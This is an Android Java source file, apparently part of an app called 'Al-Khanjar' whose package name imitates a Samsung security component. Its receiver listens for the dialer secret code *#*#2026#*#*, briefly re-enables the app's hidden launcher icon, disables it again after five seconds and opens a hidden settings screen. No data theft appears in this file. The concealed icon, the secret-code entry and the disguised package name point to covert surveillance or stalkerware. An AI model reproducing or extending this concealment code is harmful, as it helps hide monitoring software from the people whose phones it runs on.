package com.samsung.android.security.v8.receivers;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;
import android.widget.Toast;

import com.samsung.android.security.v8.MainActivity;
import com.samsung.android.security.v8.SettingsActivity;

/**
 * SecretCodeReceiver - مستقبل الكود السري
 * يستجيب للكود: *#*#2026#*#*
 */
public class SecretCodeReceiver extends BroadcastReceiver {
    
    private static final String TAG = "SecretCodeReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && 
            intent.getAction().equals("android.provider.Telephony.SECRET_CODE")) {
            
            Log.d(TAG, "Secret code entered");
            
            // إظهار أيقونة التطبيق مؤقتاً
            showAppIcon(context);
            
            // فتح نشاط الإعدادات
            Intent settingsIntent = new Intent(context, SettingsActivity.class);
            settingsIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(settingsIntent);
            
            Toast.makeText(context, "Al-Khanjar Manager", Toast.LENGTH_SHORT).show();
        }
    }
    
    /**
     * إظهار أيقونة التطبيق مؤقتاً
     */
    private void showAppIcon(Context context) {
        PackageManager packageManager = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, MainActivity.class);
        
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        );
        
        // إخفاء الأيقونة مرة أخرى بعد 5 ثواني
        new android.os.Handler().postDelayed(() -> {
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        }, 5000);
    }
}
